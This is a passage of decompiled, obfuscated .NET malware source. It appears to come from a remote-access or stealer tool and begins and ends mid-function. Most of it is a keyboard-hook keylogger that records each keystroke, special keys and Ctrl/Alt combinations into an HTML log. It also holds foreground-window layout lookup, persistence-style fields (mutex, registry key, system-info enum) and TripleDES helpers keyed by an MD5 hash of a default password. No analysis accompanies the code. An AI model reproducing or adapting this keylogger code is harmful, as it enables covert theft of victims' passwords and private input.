					goto IL_660;
				case 13u:
					goto IL_681;
				case 14u:
					goto IL_367;
				case 16u:
					goto IL_C3F;
				case 17u:
					afg.cdv += <Module>.smethod_strings_decryptor(305088 -> "<font color=#008000>{F8}</font>"));
					num2 = (num * 1786470372u ^ 1026123160u);
					continue;
				case 18u:
					goto IL_164;
				case 20u:
					goto IL_C62;
				case 21u:
					goto IL_C80;
				case 24u:
					goto IL_1A0;
				case 25u:
					goto IL_278;
				case 27u:
					afg.cdv += <Module>.smethod_strings_decryptor(321256 -> "&gt;"));
					num2 = (num * 3060717891u ^ 32369288u);
					continue;
				case 28u:
					if (!afg.byz())
					{
						num2 = (num * 3945418453u ^ 357415944u);
						continue;
					}
					goto IL_C08;
				case 29u:
					goto IL_23A;
				case 30u:
					goto IL_E1;
				case 31u:
					afg.cdv += <Module>.smethod_strings_decryptor(305424 -> "<font color=#008000>{F6}</font>"));
					num2 = (num * 2288570066u ^ 212344404u);
					continue;
				case 32u:
					afg.cdv += afg.cdg(checked((uint)bqz)).ToUpper();
					num2 = (num * 367230201u ^ 3526761716u);
					continue;
				case 33u:
					goto IL_CAD;
				case 34u:
					afg.cdv += <Module>.smethod_strings_decryptor(305520 -> "<font color=#008000>{HOME}</font>"));
					num2 = (num * 3023272908u ^ 3963544501u);
					continue;
				case 35u:
					goto IL_6A2;
				case 37u:
					num2 = (num * 2972493309u ^ 3885703847u);
					continue;
				case 38u:
					goto IL_CD0;
				case 39u:
					goto IL_3A6;
				case 40u:
					goto IL_CEE;
				case 41u:
					goto IL_D48;
				case 42u:
					goto IL_1EB;
				case 43u:
					afg.cdv += <Module>.smethod_strings_decryptor(305864 -> "<font color=#008000>&darr;</font>"));
					num2 = (num * 3122728956u ^ 1560166389u);
					continue;
				case 44u:
					goto IL_385;
				case 45u:
					goto IL_D0C;
				case 46u:
					goto IL_1CD;
				case 47u:
					goto IL_173;
				case 48u:
					goto IL_182;
				case 49u:
					goto IL_D2A;
				case 50u:
					goto IL_1BE;
				case 51u:
					if (bqz.ToString().ToLower().Contains(<Module>.smethod_strings_decryptor(321160 -> "control"))))
					{
						num2 = (num * 1723830249u ^ 3500324778u);
						continue;
					}
					goto IL_D48;
				case 52u:
					goto IL_191;
				case 53u:
					afg.cdv += " ";
					num2 = (num * 918857488u ^ 3146487411u);
					continue;
				case 55u:
					afg.cdv += afg.cdg(checked((uint)bqz)).ToUpper();
					num2 = (num * 2677165806u ^ 903078457u);
					continue;
				case 56u:
					goto IL_259;
				case 57u:
					afg.cgj = bqz.ToString();
					num2 = (num * 496965345u ^ 2820863470u);
					continue;
				case 58u:
					goto IL_D8B;
				case 59u:
					goto IL_42E;
				case 60u:
					goto IL_5A;
				case 61u:
					goto IL_6B1;
				case 62u:
					goto IL_562;
				case 63u:
					goto IL_DA9;
				case 64u:
					goto IL_3F1;
				case 65u:
					goto IL_1AF;
				case 66u:
					goto IL_706;
				case 67u:
					goto IL_4CE;
				case 69u:
					goto IL_DCC;
				case 70u:
					goto IL_4DD;
				case 71u:
					afg.cdv += <Module>.smethod_strings_decryptor(305016 -> "<font color=#008000>{F7}</font>"));
					num2 = (num * 4261742135u ^ 4118651388u);
					continue;
				case 72u:
					num2 = (num * 1655022494u ^ 1341323699u);
					continue;
				case 74u:
					if (bqz == Keys.Back)
					{
						num2 = (num * 1105074256u ^ 741254649u);
						continue;
					}
					goto IL_660;
				case 75u:
					goto IL_632;
				case 76u:
				{
					string left;
					if (Operators.CompareString(left, <Module>.smethod_strings_decryptor(306464 -> "</font>")), false) != 0 & Operators.CompareString(afg.cdv.Substring(checked(afg.cdv.Length - 4)), <Module>.smethod_strings_decryptor(306056 -> "<br>")), false) != 0)
					{
						num2 = (num * 719092392u ^ 1397831801u);
						continue;
					}
					break;
				}
				case 77u:
					afg.cdv += <Module>.smethod_strings_decryptor(305184 -> "<font color=#008000>{F12}</font>"));
					num2 = (num * 985538445u ^ 3213806574u);
					continue;
				case 78u:
					goto IL_376;
				case 79u:
					goto IL_1DC;
				case 80u:
					afg.cdv += afg.cdg(checked((uint)bqz)).ToLower();
					num2 = (num * 3474448043u ^ 2640238824u);
					continue;
				case 81u:
					goto IL_54B;
				case 83u:
					afg.cdv += <Module>.smethod_strings_decryptor(321328 -> "&quot;"));
					num2 = (num * 1149140586u ^ 688799199u);
					continue;
				case 84u:
					afg.cdv += <Module>.smethod_strings_decryptor(305496 -> "<font color=#008000>{Insert}</font>"));
					num2 = (num * 1079725124u ^ 1288583298u);
					continue;
				case 85u:
					goto IL_4BF;
				case 86u:
					goto IL_394;
				case 87u:
					goto IL_358;
				case 88u:
					num2 = (num * 2151850272u ^ 844093513u);
					continue;
				case 89u:
					afg.cdv += <Module>.smethod_strings_decryptor(306104 -> "<font color=#008000>{ALT+F4}</font>"));
					num2 = (num * 1490329179u ^ 2495379568u);
					continue;
				case 90u:
					afg.cdv += <Module>.smethod_strings_decryptor(305960 -> "<font color=#008000>{END}</font>"));
					num2 = (num * 2926742455u ^ 1158452092u);
					continue;
				case 92u:
				case 97u:
					goto IL_C08;
				case 95u:
					goto IL_E03;
				case 96u:
					goto IL_E21;
				case 98u:
					goto IL_88;
				case 99u:
					goto IL_E3F;
				case 100u:
					if (afg.cef == Conversions.ToBoolean(<Module>.smethod_strings_decryptor(306416 -> "False"))))
					{
						num2 = (num * 3217285359u ^ 875304744u);
						continue;
					}
					goto IL_42E;
				case 101u:
					goto IL_349;
				case 102u:
					goto IL_E5D;
				case 103u:
					if (afg.cfz.Length > 0)
					{
						num2 = (num * 2920184299u ^ 408496123u);
						continue;
					}
					goto IL_C08;
				case 104u:
					goto IL_E78;
				case 105u:
					goto IL_E93;
				case 106u:
					afg.cdv = afg.cdv.Substring(0, checked(afg.cdv.Length - 1));
					num2 = (num * 2701427473u ^ 1239143739u);
					continue;
				case 107u:
					afg.cdv += <Module>.smethod_strings_decryptor(305808 -> "<font color=#008000>&larr;</font>"));
					num2 = (num * 3986966907u ^ 2320827408u);
					continue;
				case 109u:
					afg.cdv += <Module>.smethod_strings_decryptor(321280 -> "&lt;"));
					num2 = (num * 4263318376u ^ 536366490u);
					continue;
				case 110u:
					goto IL_155;
				case 111u:
					goto IL_EAE;
				case 112u:
					if (Operators.CompareString(afg.cdv.Substring(checked(afg.cdv.Length - afg.cgk.Length), afg.cgk.Length), afg.cgk, false) != 0)
					{
						num2 = (num * 932086479u ^ 1321393400u);
						continue;
					}
					break;
				case 114u:
					goto IL_B6;
				case 116u:
					goto IL_3B;
				case 118u:
					if (afg.cfz.Length > 0)
					{
						num2 = (num * 1501394103u ^ 1879481319u);
						continue;
					}
					goto IL_C08;
				}
				break;
				IL_3B:
				checked
				{
					if (Operators.CompareString(afg.cdg((uint)bqz), "\"", false) == 0)
					{
						num2 = 2574787342u;
						continue;
					}
					goto IL_5A;
					IL_278:
					if (Operators.CompareString(afg.cdg((uint)bqz), ">", false) == 0)
					{
						num2 = 3211956826u;
						continue;
					}
					goto IL_3B;
					IL_259:
					if (Operators.CompareString(afg.cdg((uint)bqz), "<", false) == 0)
					{
						num2 = 2230158110u;
						continue;
					}
					goto IL_278;
					IL_23A:
					if (Operators.CompareString(afg.cdg((uint)bqz), "&", false) == 0)
					{
						num2 = 4040437260u;
						continue;
					}
					goto IL_259;
					IL_1EB:
					if (hj.hk.Keyboard.CtrlKeyDown & !hj.hk.Keyboard.AltKeyDown & bqz != Keys.Menu & bqz != Keys.LMenu & bqz != Keys.RMenu)
					{
						num2 = 2944258703u;
						continue;
					}
					goto IL_23A;
					IL_1DC:
					if (bqz == Keys.Space)
					{
						num2 = 3908117006u;
						continue;
					}
					goto IL_1EB;
					IL_1CD:
					if (bqz == Keys.F12)
					{
						num2 = 2682790972u;
						continue;
					}
					goto IL_1DC;
					IL_1BE:
					if (bqz == Keys.F11)
					{
						num2 = 3285276313u;
						continue;
					}
					goto IL_1CD;
					IL_1AF:
					if (bqz == Keys.F10)
					{
						num2 = 4012308547u;
						continue;
					}
					goto IL_1BE;
					IL_1A0:
					if (bqz == Keys.F9)
					{
						num2 = 3037018652u;
						continue;
					}
					goto IL_1AF;
					IL_191:
					if (bqz == Keys.F8)
					{
						num2 = 3470589540u;
						continue;
					}
					goto IL_1A0;
					IL_182:
					if (bqz == Keys.F7)
					{
						num2 = 2784712316u;
						continue;
					}
					goto IL_191;
					IL_173:
					if (bqz == Keys.F6)
					{
						num2 = 2446020370u;
						continue;
					}
					goto IL_182;
					IL_164:
					if (bqz == Keys.F5)
					{
						num2 = 3674357243u;
						continue;
					}
					goto IL_173;
					IL_155:
					if (bqz == Keys.F4)
					{
						num2 = 2465904803u;
						continue;
					}
					goto IL_164;
					IL_3F1:
					if (bqz == Keys.F3)
					{
						num2 = 2921335217u;
						continue;
					}
					goto IL_155;
					IL_3E2:
					if (bqz == Keys.F2)
					{
						num2 = 3609547205u;
						continue;
					}
					goto IL_3F1;
					IL_3D3:
					if (bqz == Keys.F1)
					{
						num2 = 2252058508u;
						continue;
					}
					goto IL_3E2;
					IL_3C4:
					if (bqz == Keys.Return)
					{
						num2 = 3079618106u;
						continue;
					}
					goto IL_3D3;
					IL_3B5:
					if (bqz == Keys.Prior)
					{
						num2 = 3272355676u;
						continue;
					}
					goto IL_3C4;
					IL_3A6:
					if (bqz == Keys.Next)
					{
						num2 = 3874288724u;
						continue;
					}
					goto IL_3B5;
					IL_394:
					if (bqz == Keys.NumLock)
					{
						num2 = 2833693496u;
						continue;
					}
					goto IL_3A6;
					IL_385:
					if (bqz == Keys.Insert)
					{
						num2 = 2227722848u;
						continue;
					}
					goto IL_394;
					IL_376:
					if (bqz == Keys.Home)
					{
						num2 = 2796028860u;
						continue;
					}
					goto IL_385;
					IL_367:
					if (bqz == Keys.End)
					{
						num2 = 4222239020u;
						continue;
					}
					goto IL_376;
					IL_358:
					if (bqz == Keys.Delete)
					{
						num2 = 3734930016u;
						continue;
					}
					goto IL_367;
					IL_349:
					if (bqz == Keys.Right)
					{
						num2 = 3053483344u;
						continue;
					}
					goto IL_358;
					IL_4DD:
					if (bqz == Keys.Left)
					{
						num2 = 3642394276u;
						continue;
					}
					goto IL_349;
					IL_4CE:
					if (bqz == Keys.Down)
					{
						num2 = 3698412926u;
						continue;
					}
					goto IL_4DD;
					IL_4BF:
					if (bqz == Keys.Up)
					{
						num2 = 2633839219u;
						continue;
					}
					goto IL_4CE;
					IL_562:
					if (bqz == Keys.Capital)
					{
						num2 = 2508027233u;
						continue;
					}
					goto IL_4BF;
					IL_54B:
					if (bqz == Keys.LWin | bqz == Keys.RWin)
					{
						num2 = 2452858201u;
						continue;
					}
					goto IL_562;
					IL_6B1:
					if (bqz == Keys.Escape)
					{
						num2 = 3165964717u;
						continue;
					}
					goto IL_54B;
					IL_6A2:
					if (bqz == Keys.Tab)
					{
						num2 = 3202328104u;
						continue;
					}
					goto IL_6B1;
					IL_681:
					if (hj.hk.Keyboard.AltKeyDown & bqz == Keys.F4)
					{
						num2 = 3583058974u;
						continue;
					}
					goto IL_6A2;
					IL_660:
					if (hj.hk.Keyboard.AltKeyDown & bqz == Keys.Tab)
					{
						num2 = 3524044917u;
						continue;
					}
					goto IL_681;
					IL_5A:
					if (hj.hk.Keyboard.CapsLock & !hj.hk.Keyboard.ShiftKeyDown)
					{
						num2 = 2648607274u;
						continue;
					}
					IL_88:
					if (!hj.hk.Keyboard.CapsLock & hj.hk.Keyboard.ShiftKeyDown)
					{
						num2 = 2256342649u;
						continue;
					}
					IL_B6:
					if (hj.hk.Keyboard.CapsLock & hj.hk.Keyboard.ShiftKeyDown)
					{
						num2 = 3120474642u;
						continue;
					}
					IL_E1:
					afg.cdv += afg.cdg((uint)bqz).ToLower();
					num2 = 3069108809u;
					continue;
					IL_42E:
					if (Operators.CompareString(afg.cdv, "", false) != 0)
					{
						num2 = 4248209748u;
						continue;
					}
					break;
					IL_632:
					if (afg.cfw != 2)
					{
						goto IL_C08;
					}
					num2 = 3981715548u;
				}
			}
			goto IL_DF9;
			IL_C17:
			afg.cdv += <Module>.smethod_strings_decryptor(306200 -> "<font color=#008000>{CAPSLOCK}</font>"));
			return;
			IL_C3F:
			afg.cdv += <Module>.smethod_strings_decryptor(306152 -> "<font color=#008000>{ESC}</font>"));
			return;
			IL_C62:
			afg.cdv += <Module>.smethod_strings_decryptor(306224 -> "<font color=#008000>{Win}</font>"));
			return;
			IL_C80:
			afg.cdv += <Module>.smethod_strings_decryptor(305984 -> "<font color=#008000>{DEL}</font>"));
			return;
			IL_CAD:
			afg.cdv += <Module>.smethod_strings_decryptor(305672 -> "<font color=#008000>{PageDown}</font>"));
			return;
			IL_CD0:
			afg.cdv += <Module>.smethod_strings_decryptor(305112 -> "<font color=#008000>{F11}</font>"));
			return;
			IL_CEE:
			afg.cdv += <Module>.smethod_strings_decryptor(305912 -> "<font color=#008000>&rarr;</font>"));
			return;
			IL_D0C:
			afg.cdv += <Module>.smethod_strings_decryptor(306176 -> "<font color=#008000>{TAB}</font>"));
			return;
			IL_D2A:
			afg.cdv += <Module>.smethod_strings_decryptor(305568 -> "<font color=#008000>{NumLock}</font>"));
			return;
			IL_D48:
			afg.cdv += <Module>.smethod_strings_decryptor(321104 -> "<font color=#008000>{CTRL}</font>"));
			afg.cdv += bqz.ToString();
			afg.cgj = null;
			return;
			IL_D8B:
			afg.cdv += <Module>.smethod_strings_decryptor(306000 -> "<font color=#008000>{ALT+TAB}</font>"));
			return;
			IL_DA9:
			afg.cdv += <Module>.smethod_strings_decryptor(305376 -> "<font color=#008000>{F4}</font>"));
			return;
			IL_DCC:
			afg.cdv += <Module>.smethod_strings_decryptor(305136 -> "<font color=#008000>{F10}</font>"));
			IL_DF9:
			return;
			IL_E03:
			afg.cdv += <Module>.smethod_strings_decryptor(305480 -> "<font color=#008000>{F5}</font>"));
			return;
			IL_E21:
			afg.cdv += <Module>.smethod_strings_decryptor(305616 -> "<font color=#008000>{PageUp}</font>"));
			return;
			IL_E3F:
			afg.cdv += <Module>.smethod_strings_decryptor(306392 -> "<font color=#008000>{BACK}</font>"));
			return;
			IL_E5D:
			afg.cdv += <Module>.smethod_strings_decryptor(305064 -> "<font color=#008000>{F9}</font>"));
			return;
			IL_E78:
			afg.cdv += <Module>.smethod_strings_decryptor(305304 -> "<font color=#008000>{F3}</font>"));
			return;
			IL_E93:
			afg.cdv += <Module>.smethod_strings_decryptor(305328 -> "<font color=#008000>{F2}</font>"));
			return;
			IL_EAE:
			afg.cdv += <Module>.smethod_strings_decryptor(305256 -> "<font color=#008000>{F1}</font>"));
			return;
			IL_706:
			num2 = 2374729848u;
			goto IL_A11;
			IL_C08:
			afg.bvx();
			num2 = 3313403515u;
			goto IL_A11;
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600008E RID: 142 RVA: 0x00020BA0 File Offset: 0x0001EDA0
	private static string cdg(uint cdh)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] array = new byte[255];
			bool keyboardState = afg.GetKeyboardState(array);
			string result;
			for (;;)
			{
				IL_C9:
				uint num = 1717864973u;
				for (;;)
				{
					uint num2;
					IntPtr foregroundWindow;
					int num3;
					switch ((num2 = (num ^ 1623694648u)) % 7u)
					{
					case 0u:
						goto IL_D0;
					case 1u:
						if (!keyboardState)
						{
							num = (num2 * 430353458u ^ 1433874702u);
							continue;
						}
						goto IL_71;
					case 2u:
						goto IL_71;
					case 4u:
						goto IL_C9;
					case 5u:
					{
						int windowThreadProcessId = afg.GetWindowThreadProcessId(foregroundWindow, ref num3);
						IntPtr brz = (IntPtr)afg.GetKeyboardLayout(windowThreadProcessId);
						afg.ToUnicodeEx(cdh, cdh, array, stringBuilder, 16, 0u, brz);
						num = (num2 * 3760264208u ^ 1894956716u);
						continue;
					}
					case 6u:
						result = stringBuilder.ToString();
						num = (num2 * 3803692166u ^ 4069944339u);
						continue;
					}
					goto Block_3;
					IL_71:
					foregroundWindow = afg.GetForegroundWindow();
					num3 = 0;
					num = 365534427u;
				}
			}
			Block_3:
			goto IL_D8;
			IL_D0:
			result = "";
			IL_D8:
			return result;
		}
		catch (Exception ex)
		{
			for (;;)
			{
				IL_11E:
				uint num4 = 776616641u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num4 ^ 1623694648u)) % 3u)
					{
					case 0u:
						goto IL_11E;
					case 2u:
						num4 = (num2 * 2112065355u ^ 3227986673u);
						continue;
					}
					goto Block_5;
				}
			}
			Block_5:;
		}
		return (checked((Keys)cdh)).ToString();
	}

	// Token: 0x0400032E RID: 814
	private static afg.ho cdt = default(afg.ho);

	// Token: 0x0400032F RID: 815
	private static bool cdu = true;

	// Token: 0x04000330 RID: 816
	private static string cdv = "";

	// Token: 0x04000331 RID: 817
	private static bool cdy = false;

	// Token: 0x04000332 RID: 818
	private static bool cdx;

	// Token: 0x04000333 RID: 819
	private static bool cdw;

	// Token: 0x04000334 RID: 820
	private static string cdq;

	// Token: 0x04000335 RID: 821
	private static string cdz;

	// Token: 0x04000336 RID: 822
	private static bool cef;

	// Token: 0x04000337 RID: 823
	private static string ceg;

	// Token: 0x04000338 RID: 824
	private static bool ceh;

	// Token: 0x04000339 RID: 825
	private static bool cej;

	// Token: 0x0400033A RID: 826
	private static bool cek;

	// Token: 0x0400033B RID: 827
	private static bool cel;

	// Token: 0x0400033C RID: 828
	private static bool cem;

	// Token: 0x0400033D RID: 829
	private static bool cen;

	// Token: 0x0400033E RID: 830
	private static bool ceo;

	// Token: 0x0400033F RID: 831
	private static bool cep;

	// Token: 0x04000340 RID: 832
	private static bool cer;

	// Token: 0x04000341 RID: 833
	private static bool ces;

	// Token: 0x04000342 RID: 834
	private static string cet;

	// Token: 0x04000343 RID: 835
	private static bool ceu;

	// Token: 0x04000344 RID: 836
	private static bool cev;

	// Token: 0x04000345 RID: 837
	private static bool cey;

	// Token: 0x04000346 RID: 838
	private static bool cex;

	// Token: 0x04000347 RID: 839
	private static string cew;

	// Token: 0x04000348 RID: 840
	private static bool ceq;

	// Token: 0x04000349 RID: 841
	private static bool cez;

	// Token: 0x0400034A RID: 842
	private static string cfg;

	// Token: 0x0400034B RID: 843
	private static string cfh;

	// Token: 0x0400034C RID: 844
	private static string cfj;

	// Token: 0x0400034D RID: 845
	private static string cfk;

	// Token: 0x0400034E RID: 846
	public static int FrameworkVersion;

	// Token: 0x0400034F RID: 847
	private static Random cfl;

	// Token: 0x04000350 RID: 848
	private static RegistryKey cfm;

	// Token: 0x04000351 RID: 849
	private static object cfn;

	// Token: 0x04000352 RID: 850
	private static string cfo;

	// Token: 0x04000353 RID: 851
	private static Mutex cfp;

	// Token: 0x04000354 RID: 852
	private static string cfr;

	// Token: 0x04000355 RID: 853
	[AccessedThroughProperty("MH")]
	private static afg.ux cfs;

	// Token: 0x04000356 RID: 854
	[AccessedThroughProperty("CH")]
	private static afg.acm cft;

	// Token: 0x04000357 RID: 855
	[AccessedThroughProperty("kbHook")]
	private static afg.adm cfu;

	// Token: 0x04000358 RID: 856
	private static string cfv;

	// Token: 0x04000359 RID: 857
	private static IntPtr cfy;

	// Token: 0x0400035A RID: 858
	private static int cfx;

	// Token: 0x0400035B RID: 859
	private static int cfw;

	// Token: 0x0400035C RID: 860
	private static bool cfq;

	// Token: 0x0400035D RID: 861
	private static string[] cfz;

	// Token: 0x0400035E RID: 862
	private static string cgh;

	// Token: 0x0400035F RID: 863
	private static string cgj;

	// Token: 0x04000360 RID: 864
	private static string cgk;

	// Token: 0x02000011 RID: 17
	public struct ho
	{
		// Token: 0x04000361 RID: 865
		[MarshalAs(UnmanagedType.U4)]
		public int cbSize;

		// Token: 0x04000362 RID: 866
		[MarshalAs(UnmanagedType.U4)]
		public int dwTime;
	}

	// Token: 0x02000012 RID: 18
	public enum hp
	{
		// Token: 0x04000364 RID: 868
		OperatingSystemName,
		// Token: 0x04000365 RID: 869
		ProcessorName,
		// Token: 0x04000366 RID: 870
		AmountOfMemory,
		// Token: 0x04000367 RID: 871
		VideocardName,
		// Token: 0x04000368 RID: 872
		VideocardMem
	}

	// Token: 0x02000013 RID: 19
	public class hr
	{
		// Token: 0x0600008F RID: 143 RVA: 0x00020CF4 File Offset: 0x0001EEF4
		public hr(string Password = "password")
		{
			this.no = Password;
		}

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x06000090 RID: 144 RVA: 0x00020D10 File Offset: 0x0001EF10
		public string mz
		{
			get
			{
				UTF8Encoding utf8Encoding = new UTF8Encoding();
				return utf8Encoding.GetString(this.mw);
			}
		}

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x06000091 RID: 145 RVA: 0x00020D30 File Offset: 0x0001EF30
		// (set) Token: 0x06000092 RID: 146 RVA: 0x00020D4C File Offset: 0x0001EF4C
		public string no
		{
			get
			{
				new UTF8Encoding();
				return this.mq;
			}
			set
			{
				UTF8Encoding utf8Encoding = new UTF8Encoding();
				MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
				this.mw = md5CryptoServiceProvider.ComputeHash(utf8Encoding.GetBytes(value));
				for (;;)
				{
					IL_5C:
					uint num = 2361331438u;
					for (;;)
					{
						uint num2;
						switch ((num2 = (num ^ 3973809946u)) % 3u)
						{
						case 0u:
							goto IL_5C;
						case 1u:
							this.mq = value;
							num = (num2 * 2705277771u ^ 1335074071u);
							continue;
						}
						return;
					}
				}
			}
		}

		// Token: 0x06000093 RID: 147 RVA: 0x00020DBC File Offset: 0x0001EFBC
		public string hs(string ht)
		{
			byte[] inArray = null;
			UTF8Encoding utf8Encoding = new UTF8Encoding();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			try
			{
				byte[] key = this.mw;
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				byte[] bytes = utf8Encoding.GetBytes(ht);
				try
				{
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateEncryptor();
					inArray = cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length);
				}
				finally
				{
					tripleDESCryptoServiceProvider.Clear();
					for (;;)
					{
						IL_9F:
						uint num = 959834089u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num ^ 1938734948u)) % 3u)
							{
							case 0u:
								goto IL_9F;
							case 1u:
								md5CryptoServiceProvider.Clear();
								num = (num2 * 936219049u ^ 3247871080u);
								continue;
							}
							goto Block_6;
						}
					}
					Block_6:;
				}
			}
			finally
			{
				if (md5CryptoServiceProvider != null)
				{
					for (;;)
					{
						IL_E6:
						uint num3 = 401129895u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num3 ^ 1938734948u)) % 3u)
							{
							case 1u:
								((IDisposable)md5CryptoServiceProvider).Dispose();
								num3 = (num2 * 3964170629u ^ 3363781197u);
								continue;
							case 2u:
								goto IL_E6;
							}
							goto Block_9;
						}
					}
					Block_9:;
				}
			}
			return Convert.ToBase64String(inArray);
		}

		// Token: 0x06000094 RID: 148 RVA: 0x00020EDC File Offset: 0x0001F0DC
		private string jl(string jm, byte[] jn)
		{
			byte[] inArray = null;
			UTF8Encoding utf8Encoding = new UTF8Encoding();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			try
			{
				byte[] key = md5CryptoServiceProvider.ComputeHash(utf8Encoding.GetBytes(utf8Encoding.GetString(jn)));
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				byte[] bytes = utf8Encoding.GetBytes(jm);
				try
				{
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateEncryptor();
					inArray = cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length);
				}
				finally
				{
					tripleDESCryptoServiceProvider.Clear();
					for (;;)
					{
						IL_AC:
						uint num = 182262329u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num ^ 2053915545u)) % 3u)
							{
							case 0u:
								goto IL_AC;
							case 1u:
								md5CryptoServiceProvider.Clear();
								num = (num2 * 2745465480u ^ 3049251302u);
								continue;
							}
							goto Block_6;
						}
					}
					Block_6:;
				}
			}
			finally
			{
				if (md5CryptoServiceProvider != null)
				{
					for (;;)
					{
						IL_F3:
						uint num3 = 1012606681u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num3 ^ 2053915545u)) % 3u)
							{
							case 0u:
								goto IL_F3;
							case 2u:
								((IDisposable)md5CryptoServiceProvider).Dispose();
								num3 = (num2 * 1368005450u ^ 4084951155u);
								continue;
							}
							goto Block_9;
						}
					}
					Block_9:;
				}
			}
			return Convert.ToBase64String(inArray);
		}

		// Token: 0x06000095 RID: 149 RVA: 0x00021008 File Offset: 0x0001F208
		public string jx(string jw, string jq)
		{
			byte[] inArray = null;
			UTF8Encoding utf8Encoding;
			for (;;)
			{
				IL_3E:
				uint num = 1038699839u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 1775263154u)) % 3u)
					{
					case 1u:
						utf8Encoding = new UTF8Encoding();
						num = (num2 * 2304190527u ^ 3734462740u);
						continue;
					case 2u:
						goto IL_3E;
					}
					goto Block_1;
				}
			}
			Block_1:
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			try
			{
				byte[] key = md5CryptoServiceProvider.ComputeHash(utf8Encoding.GetBytes(jq));
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				byte[] bytes = utf8Encoding.GetBytes(jw);
				try
				{
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateEncryptor();
					inArray = cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length);
				}
				finally
				{
					tripleDESCryptoServiceProvider.Clear();
					md5CryptoServiceProvider.Clear();
				}
			}
			finally
			{
				if (md5CryptoServiceProvider != null)
				{
					for (;;)
					{
						IL_EA:
						uint num3 = 427256097u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num3 ^ 1775263154u)) % 3u)
							{
							case 0u:
								goto IL_EA;
							case 1u:
								((IDisposable)md5CryptoServiceProvider).Dispose();
								num3 = (num2 * 756266101u ^ 3067904330u);
								continue;
							}
							goto Block_9;
						}
					}
					Block_9:;
				}
			}
			return Convert.ToBase64String(inArray);
		}

		// Token: 0x06000096 RID: 150 RVA: 0x0002112C File Offset: 0x0001F32C
		public string kt(string ku)
		{
			byte[] bytes = null;
			UTF8Encoding utf8Encoding = new UTF8Encoding();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			try
			{
				byte[] key = this.mw;
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				byte[] array = Convert.FromBase64String(ku);
				try
				{
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
					bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
				}
				finally
				{
					tripleDESCryptoServiceProvider.Clear();
					md5CryptoServiceProvider.Clear();
				}
			}
			finally
			{
				if (md5CryptoServiceProvider != null)
				{
					for (;;)
					{
						IL_A5:
						uint num = 3954423250u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num ^ 3212974015u)) % 3u)
							{
							case 0u:
								goto IL_A5;
							case 2u:
								((IDisposable)md5CryptoServiceProvider).Dispose();
								num = (num2 * 3103589106u ^ 1760101006u);
								continue;
							}
							goto Block_8;
						}
					}
					Block_8:;
				}
			}
			return utf8Encoding.GetString(bytes);
		}

		// Token: 0x06000097 RID: 151 RVA: 0x0002120C File Offset: 0x0001F40C
		public string lo(string lp, byte[] lr)
		{
			byte[] bytes = null;
			UTF8Encoding utf8Encoding = new UTF8Encoding();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			try
			{
				byte[] key = md5CryptoServiceProvider.ComputeHash(utf8Encoding.GetBytes(utf8Encoding.GetString(lr)));
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				for (;;)
				{
					IL_87:
					uint num = 4016611677u;
					for (;;)
					{
						uint num2;
						switch ((num2 = (num ^ 2743632462u)) % 4u)
						{
						case 0u:
							goto IL_87;
						case 2u:
							tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
							num = (num2 * 1676052139u ^ 2620199353u);
							continue;
						case 3u:
							tripleDESCryptoServiceProvider.Key = key;
							num = (num2 * 3125527137u ^ 3014664051u);
							continue;
						}
						goto Block_3;
					}
				}
				Block_3:
				tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				byte[] array = Convert.FromBase64String(lp);
				try
				{
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
					bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
				}
				finally
				{
					tripleDESCryptoServiceProvider.Clear();
					md5CryptoServiceProvider.Clear();
				}
			}
			finally
			{
				if (md5CryptoServiceProvider != null)
				{
					for (;;)
					{
						IL_105:
						uint num3 = 4163950553u;
						for (;;)
						{
							uint num2;
